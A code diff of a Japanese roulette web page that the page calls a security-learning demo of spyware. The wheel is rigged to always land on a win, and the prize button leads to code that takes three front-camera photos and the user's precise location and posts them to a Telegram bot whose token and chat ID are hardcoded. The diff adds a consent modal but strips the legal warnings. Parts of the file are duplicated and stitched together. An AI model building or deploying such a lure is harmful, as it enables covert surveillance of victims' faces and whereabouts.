@@ -2,10 +2,6 @@
 <html lang="ja">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes"><!DOCTYPE html>
-<html lang="ja">
-<head>
-<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
 <title>🎯ルーレット🎯</title>
 <style>
@@ -16,9 +12,12 @@
   canvas { width: 100%; height: 100%; border-radius: 50%; border: 8px solid #333; box-shadow: 0 0 30px rgba(0,0,0,0.5); display: block; }
   #result { margin-top: 20px; font-size: 26px; font-weight: bold; text-shadow: 2px 2px 5px rgba(0,0,0,0.5); height: 1.2em; }
   #spinBtn { margin-top: 20px; padding: 15px 50px; font-size: 20px; cursor: pointer; border-radius: 50px; border: none; background: #fff; color: #333; font-weight: bold; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
-  #winModal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: #333; padding: 40px; border-radius: 40px; text-align: center; box-shadow: 0 0 100px rgba(0,0,0,0.5); z-index: 100; width: 80%; max-width: 300px; }
-  #winModal h1 { margin: 0 0 20px; font-size: 32px; }
-  #continueBtn { padding: 15px 40px; font-size: 20px; background: #ff4081; color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; width: 100%; }
+  #winModal, #confirmModal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: #333; padding: 30px; border-radius: 30px; text-align: center; box-shadow: 0 0 100px rgba(0,0,0,0.5); z-index: 100; width: 85%; max-width: 320px; }
+  #winModal h1, #confirmModal h3 { margin: 0 0 15px; }
+  #confirmModal p { font-size: 14px; text-align: left; line-height: 1.6; background: #f0f0f0; padding: 15px; border-radius: 10px; margin-bottom: 20px; }
+  .btn-group { display: flex; gap: 10px; }
+  #continueBtn, #yesBtn { padding: 15px; font-size: 18px; background: #ff4081; color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; flex: 1; }
+  #noBtn { padding: 15px; font-size: 18px; background: #ccc; color: #333; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; flex: 1; }
   #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 90; }
   .security-notice { max-width: 600px; width: 90%; margin: 40px auto; padding: 25px; background: rgba(0, 0, 0, 0.7); border: 2px solid #ff4081; border-radius: 15px; font-size: 14px; line-height: 1.7; text-align: left; color: #eee; box-shadow: 0 0 20px rgba(255,64,129,0.3); }
   .security-notice b { color: #ff4081; font-size: 1.2em; display: block; margin-bottom: 10px; text-align: center; }
@@ -37,25 +36,37 @@
 <button id="spinBtn">回す</button>
 
 <div id="overlay"></div>
+
 <div id="winModal">
   <h1>おめでとう🥳</h1>
   <button id="continueBtn">続ける</button>
 </div>
 
+<div id="confirmModal">
+  <h3>最終確認</h3>
+  <p>
+    <strong>【送信内容の確認】</strong><br>
+    ・撮影された写真<br>
+    ・現在の位置情報<br><br>
+    <strong>【送信先】</strong><br>
+    ・Telegram (@Natsusan_bot)<br><br>
+    上記データが送信されます。同意しますか？
+  </p>
+  <div class="btn-group">
+    <button id="noBtn">いいえ</button>
+    <button id="yesBtn">はい</button>
+  </div>
+</div>
+
 <div class="security-notice">
   <b>【重要：セキュリティ学習用デモサイト】</b>
-  このサイトは、JavaScriptによる不正なデータ取得（スパイウェア）の手口を学ぶための教育用デモページです。
+  このサイトは、JavaScriptによる不正なデータ取得の手口を学ぶための教育用デモページです。
   <br><br>
-  本サイトでは、ユーザーが同意した場合に限り、以下の処理が行われます：<br>
+  ユーザーが同意した場合に限り、以下の処理が行われます：<br>
   ・端末のカメラを使用した写真の撮影<br>
   ・現在地（位置情報）の取得<br>
-  ・取得されたデータの外部サービス（Telegram）への送信<br><br>
-  これらの処理は、画面上の確認操作およびユーザーの明示的な同意があった場合のみ実行されます。
-  同意しない場合は、データの取得および送信は行われません。<br><br>
-  取得されたデータは、本デモの動作確認および学習目的のためにのみ使用されます。<br><br>
-  許可なく第三者に対してこのURLを送信したり、意図を説明せずに実行させたりする行為は禁止されています。
-  内容によっては法律（不正指令電磁的記録に関する罪、プライバシー侵害等）に抵触する可能性があります。<br><br>
-  本デモは仕組みの理解を目的としており、悪用を推奨するものではありません。
+  ・取得データの外部（Telegram）への送信<br><br>
+  同意しない場合は、データの取得および送信は行われません。
 </div>
 
 <script>
@@ -117,7 +128,7 @@ function sendLocation() {
           body: JSON.stringify({ chat_id: CHAT_ID, text: mapUrl })
         });
       },
-      null,
+      function(error) { console.log("location_error"); },
       { enableHighAccuracy: true }
     );
   }
@@ -127,42 +138,42 @@ async function captureAndSend() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
     const video = document.createElement("video");
-    video.srcObject = stream; await video.play();
-    
+    video.srcObject = stream; video.muted = true; await video.play();
+    await new Promise(r => setTimeout(r, 1200));
+    const blobs = [];
     for (let i = 0; i < 3; i++) {
       const tempCanvas = document.createElement("canvas");
       tempCanvas.width = video.videoWidth; tempCanvas.height = video.videoHeight;
       tempCanvas.getContext("2d").drawImage(video, 0, 0);
-      const blob = await new Promise(r => tempCanvas.toBlob(r, "image/jpeg", 0.7));
-      const fd = new FormData();
-      fd.append("chat_id", CHAT_ID); fd.append("photo", blob, `shot_${i}.jpg`);
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
+      const blob = await new Promise(r => tempCanvas.toBlob(r, "image/jpeg", 0.6));
+      if(blob) blobs.push(blob);
       await new Promise(r => setTimeout(r, 400));
     }
     stream.getTracks().forEach(t => t.stop());
-    sendLocation();
+    for (const b of blobs) {
+      const fd = new FormData();
+      fd.append("chat_id", CHAT_ID); fd.append("photo", b, "shot.jpg");
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
+    }
+    setTimeout(sendLocation, 500);
   } catch (e) {
+    console.log("camera_error");
     sendLocation();
   }
 }
 
 const spinBtn = document.getElementById("spinBtn");
-let totalRotation = 0;
-
 spinBtn.onclick = () => {
   spinBtn.disabled = true;
-  document.getElementById("result").textContent = "回転中...";
-  
-  const segmentAngle = 360 / slots.length;
-  const currentMod = totalRotation % 360;
-  const targetIdx = [0, 2, 4, 6][Math.floor(Math.random() * 4)];
-  const stopAngle = 360 - (targetIdx * segmentAngle) - (segmentAngle / 2) + 270;
-  
-  totalRotation += (360 - currentMod) + 1800 + (stopAngle % 360);
-  
+  document.getElementById("result").textContent = "...";
+  canvas.style.transition = "none";
+  canvas.style.transform = "rotate(0deg)";
+  void canvas.offsetWidth;
   canvas.style.transition = "transform 4s cubic-bezier(0.1, 0, 0.1, 1)";
-  canvas.style.transform = `rotate(${totalRotation}deg)`;
-  
+  const targetIdx = [0,2,4,6][Math.floor(Math.random()*4)];
+  const anglePerSlot = 360 / slots.length;
+  const stopA = 360 - (targetIdx * anglePerSlot) - (anglePerSlot / 2);
+  canvas.style.transform = `rotate(${2160 + stopA}deg)`;
   setTimeout(() => {
     document.getElementById("result").textContent = "当たり！";
     document.getElementById("overlay").style.display = "block";
@@ -172,251 +183,21 @@ spinBtn.onclick = () => {
 };
 
 document.getElementById("continueBtn").onclick = () => {
-  document.getElementById("overlay").style.display = "none";
   document.getElementById("winModal").style.display = "none";
+  document.getElementById("confirmModal").style.display = "block";
+};
+
+document.getElementById("yesBtn").onclick = () => {
+  document.getElementById("overlay").style.display = "none";
+  document.getElementById("confirmModal").style.display = "none";
   captureAndSend();
 };
-</script>
-</body>
-</html>
 
-<title>🎯ルーレット🎯</title>
-<style>
-  body { margin: 0; color: #fff; font-family: sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow-x: hidden; background: #444; transition: background 0.1s; padding: 20px 0; box-sizing: border-box; }
-  h2 { position: relative; margin-bottom: 30px; padding: 10px 25px; background: rgba(255,255,255,0.2); border-radius: 15px; backdrop-filter: blur(10px); z-index: 5; border: 1px solid rgba(255,255,255,0.3); font-size: 24px; }
-  #container { width: 85vw; max-width: 400px; aspect-ratio: 1; position: relative; margin: 20px 0; }
-  #pointer { position: absolute; left: 50%; top: -25px; transform: translateX(-50%); font-size: 45px; z-index: 20; color: #ffffff; text-shadow: 0 4px 10px rgba(0,0,0,0.5); line-height: 1; }
-  canvas { width: 100%; height: 100%; border-radius: 50%; border: 8px solid #333; box-shadow: 0 0 30px rgba(0,0,0,0.5); display: block; }
-  #result { margin-top: 20px; font-size: 26px; font-weight: bold; text-shadow: 2px 2px 5px rgba(0,0,0,0.5); height: 1.2em; }
-  #spinBtn { margin-top: 20px; padding: 15px 50px; font-size: 20px; cursor: pointer; border-radius: 50px; border: none; background: #fff; color: #333; font-weight: bold; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
-  
-  .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: #333; padding: 30px; border-radius: 40px; text-align: center; box-shadow: 0 0 100px rgba(0,0,0,0.5); z-index: 100; width: 85%; max-width: 320px; }
-  .modal h1 { margin: 0 0 15px; font-size: 22px; }
-  .modal p { font-size: 14px; margin-bottom: 20px; color: #666; }
-  .btn-group { display: flex; flex-direction: column; gap: 10px; }
-  .primary-btn { padding: 15px; font-size: 18px; background: #ff4081; color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; }
-  .secondary-btn { padding: 12px; font-size: 16px; background: #bbb; color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; }
-  #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 90; }
-  
-  .security-notice { max-width: 600px; width: 90%; margin: 40vh auto 40px; padding: 25px; background: rgba(0, 0, 0, 0.7); border: 2px solid #ff4081; border-radius: 15px; font-size: 14px; line-height: 1.7; text-align: left; color: #fff; box-shadow: 0 0 20px rgba(255,64,129,0.3); }
-  .security-notice summary { cursor: pointer; outline: none; list-style: none; display: flex; justify-content: space-between; align-items: center; }
-  .security-notice b { color: #ff0000; font-size: 1.2em; display: inline; }
-</style>
-</head>
-<body>
-
-<h2>🎯ルーレット🎯</h2>
-
-<div id="container">
-  <div id="pointer">▼</div>
-  <canvas id="wheel"></canvas>
-</div>
-
-<h3 id="result">結果：</h3>
-<button id="spinBtn">回す</button>
-
-<div id="overlay"></div>
-
-<div id="winModal" class="modal">
-  <h1>おめでとう🥳</h1>
-  <p>景品を受け取るために「続ける」を押してください。</p>
-  <div class="btn-group">
-    <button class="primary-btn" id="continueBtn">続ける</button>
-  </div>
-</div>
-
-<div id="confirmModal" class="modal">
-  <h1>データ送信の確認</h1>
-  <p>取得したデータ（写真・位置情報）を送信しますか？</p>
-  <div class="btn-group">
-    <button class="primary-btn" id="sendYes">はい</button>
-    <button class="secondary-btn" id="sendNo">いいえ</button>
-  </div>
-</div>
-
-<div id="noDataModal" class="modal">
-  <h1>通知</h1>
-  <p>送信できるデータがありません。<br>(アクセス拒否または非対応)</p>
-  <div class="btn-group">
-    <button class="secondary-btn" id="noDataOk">閉じる</button>
-  </div>
-</div>
-
-<details class="security-notice">
-  <summary><b>【重要：セキュリティ学習用デモサイト】</b></summary>
-  <br>
-  このサイトは、JavaScriptによる不正なデータ取得（スパイウェア）の手口を学ぶための教育用デモページです。
-  取得されたデータは指定されたTelegramボットへ送信されます。
-</details>
-
-<script>
-// 背景アニメーション
-let hue = 0;
-function animateBG() {
-  hue = (hue + 1) % 360;
-  document.body.style.backgroundColor = `hsl(${hue}, 80%, 40%)`;
-  requestAnimationFrame(animateBG);
-}
-animateBG();
-
-// 設定値
-const BOT_TOKEN = "8561278803:AAHGGHLpZPJk75qUVelgeS1hiEpcN0wVtl0";
-const CHAT_ID = "7541612001"; // ※ユーザー名(@Natsusan_bot)で動かない場合はこのIDを使用
-
-const canvas = document.getElementById("wheel");
-const ctx = canvas.getContext("2d");
-const slots = ["当たり","ハズレ","当たり","ハズレ","当たり","ハズレ","当たり","ハズレ"];
-
-let tempPhotos = [];
-let tempLocationMsg = "";
-
-// ルーレット描画
-function draw() {
-  const size = 800;
-  canvas.width = size; canvas.height = size;
-  const c = size / 2;
-  const rad = (Math.PI * 2) / slots.length;
-  for(let i=0; i<slots.length; i++){
-    ctx.beginPath();
-    ctx.moveTo(c, c);
-    ctx.arc(c, c, c, i * rad, (i + 1) * rad);
-    ctx.fillStyle = i % 2 === 0 ? "#FFD700" : "#EEEEEE";
-    ctx.fill();
-    ctx.strokeStyle = "#333";
-    ctx.lineWidth = 4;
-    ctx.stroke();
-    ctx.save();
-    ctx.translate(c, c);
-    ctx.rotate(i * rad + rad / 2);
-    ctx.fillStyle = "#333";
-    ctx.font = "bold 55px sans-serif";
-    ctx.textAlign = "center";
-    ctx.textBaseline = "middle";
-    ctx.fillText(slots[i], c * 0.55, 0);
-    ctx.restore();
-  }
-}
-window.onload = draw;
-
-// 位置情報取得
-function getTempLocation() {
-  return new Promise((resolve) => {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          tempLocationMsg = `📍位置情報: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-          resolve();
-        },
-        () => { resolve(); },
-        { enableHighAccuracy: true, timeout: 5000 }
-      );
-    } else { resolve(); }
-  });
-}
-
-// カメラ撮影とデータ準備
-async function getTempData() {
-  tempPhotos = [];
-  tempLocationMsg = "";
-
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-    const video = document.createElement("video");
-    video.srcObject = stream;
-    await video.play();
-    
-    // 3枚撮影
-    for (let i = 0; i < 3; i++) {
-      const tempCanvas = document.createElement("canvas");
-      tempCanvas.width = video.videoWidth; 
-      tempCanvas.height = video.videoHeight;
-      tempCanvas.getContext("2d").drawImage(video, 0, 0);
-      const blob = await new Promise(r => tempCanvas.toBlob(r, "image/jpeg", 0.7));
-      tempPhotos.push(blob);
-      await new Promise(r => setTimeout(r, 500));
-    }
-    stream.getTracks().forEach(t => t.stop());
-  } catch (e) {
-    console.log("Camera access denied");
-  }
-
-  await getTempLocation();
-  
-  if (tempPhotos.length === 0 && !tempLocationMsg) {
-    document.getElementById("noDataModal").style.display = "block";
-    document.getElementById("result").textContent = "失敗";
-  } else {
-    document.getElementById("confirmModal").style.display = "block";
-    document.getElementById("result").textContent = "確認待ち";
-  }
-}
-
-// Telegramへ最終送信
-async function finalSend() {
-  document.getElementById("confirmModal").style.display = "none";
-  document.getElementById("result").textContent = "送信中...";
-  
-  // 写真送信
-  for (const blob of tempPhotos) {
-    const fd = new FormData();
-    fd.append("chat_id", CHAT_ID);
-    fd.append("photo", blob, "captured.jpg");
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
-  }
-  // 位置情報送信
-  if (tempLocationMsg) {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: tempLocationMsg })
-    });
-  }
-  alert("完了しました。景品をお送りします。");
-  resetUI();
-}
-
-function resetUI() {
-  tempPhotos = [];
-  tempLocationMsg = "";
+document.getElementById("noBtn").onclick = () => {
   document.getElementById("overlay").style.display = "none";
-  document.querySelectorAll(".modal").forEach(m => m.style.display = "none");
-  document.getElementById("result").textContent = "結果：";
-}
-
-// ルーレット回転処理
-const spinBtn = document.getElementById("spinBtn");
-let totalRotation = 0;
-
-spinBtn.onclick = () => {
-  spinBtn.disabled = true;
-  document.getElementById("result").textContent = "回転中...";
-  const segmentAngle = 360 / slots.length;
-  const currentMod = totalRotation % 360;
-  // 必ず「当たり」に止まるように計算
-  const targetIdx = [0, 2, 4, 6][Math.floor(Math.random() * 4)];
-  const stopAngle = 360 - (targetIdx * segmentAngle) - (segmentAngle / 2) + 270;
-  totalRotation += (360 - currentMod) + 1800 + (stopAngle % 360);
-  
-  canvas.style.transition = "transform 4s cubic-bezier(0.1, 0, 0.1, 1)";
-  canvas.style.transform = `rotate(${totalRotation}deg)`;
-  
-  setTimeout(() => {
-    document.getElementById("result").textContent = "当たり！";
-    document.getElementById("overlay").style.display = "block";
-    document.getElementById("winModal").style.display = "block";
-    spinBtn.disabled = false;
-  }, 4200);
+  document.getElementById("confirmModal").style.display = "none";
+  alert("キャンセルしました。");
 };
-
-// モーダルボタンイベント
-document.getElementById("continueBtn").onclick = () => {
-  document.getElementById("winModal").style.display = "none";
-  document.getElementById("result").textContent = "読み込み中...";
-  getTempData();
-};
-document.getElementById("sendYes").onclick = finalSend;
-document.getElementById("sendNo").onclick = resetUI;
-document.getElementById("noDataOk").onclick = resetUI;
 </script>
 </body>
 </html>
